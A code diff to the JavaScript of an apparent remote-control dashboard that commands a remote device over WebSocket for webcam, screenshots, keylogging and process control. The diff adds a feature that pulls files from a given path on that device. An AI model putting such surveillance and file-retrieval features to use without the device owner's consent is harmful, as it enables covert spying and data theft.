@@ -103,6 +103,17 @@ function sendCommand(command) {
         }));
     }
 
+    else if (command === "DOWNLOAD") {
+        const filepath = document.getElementById("filepath").value;
+        ws.send(JSON.stringify({
+            type: "command",
+            from: clientName,
+            to: selectedDevice,
+            command: command,
+            filepath: filepath
+        }));
+    }
+
     else {
         ws.send(JSON.stringify({
             type: "command",
@@ -139,16 +150,20 @@ function handleResponse(msg) {
             displayWebcam(msg.data);
             break;
 
+        case "download":
+            if (msg.command) 
+                document.getElementById("download-msg").textContent = msg.data;
+            else 
+                autoDownloadFile(msg.data);
+            break;
+
         case "process":
-            if (msg.command === "process-kill") {
+            if (msg.command === "process-kill") 
                 document.getElementById("process-msg").textContent = msg.data;
-            }
-            else if (msg.command === "process-start") {
+            else if (msg.command === "process-start") 
                 document.getElementById("process-msg").textContent = msg.data;
-            }
-            else {
+            else 
                 renderProcessTab(msg.data);
-            }
             break;
 
         case "app":
@@ -250,6 +265,18 @@ function displayScreenshot(img) {
     imgEle.style.scale = "0.9";
 }
 
+function autoDownloadFile(fileContent) {
+    const filepath = document.getElementById("filepath").value;
+    const index = filepath.lastIndexOf("\\");
+    const filename = filepath.substr(index + 1);
+
+    const linkSource = `data:application/octet-stream;base64,${fileContent}`;
+    const downloadLink = document.createElement("a");
+    downloadLink.href = linkSource;
+    downloadLink.download = `${filename}_downloaded_${Date.now()}.dat`;
+    downloadLink.click();
+}
+
 function displayWebcam(img) {
     let imgEle = document.getElementById("webcam-screen");
     imgEle.src = "data:image/jpeg;base64," + img;
@@ -288,9 +315,6 @@ document.querySelectorAll(".tab").forEach(tab => {
         tab.classList.add("active");
         const target = tab.dataset.tab;
         document.getElementById(target).classList.add("active");
-
-        // send command based on tab
-        if (target === "keylog") sendCommand(target.toUpperCase());
     };
 });
 
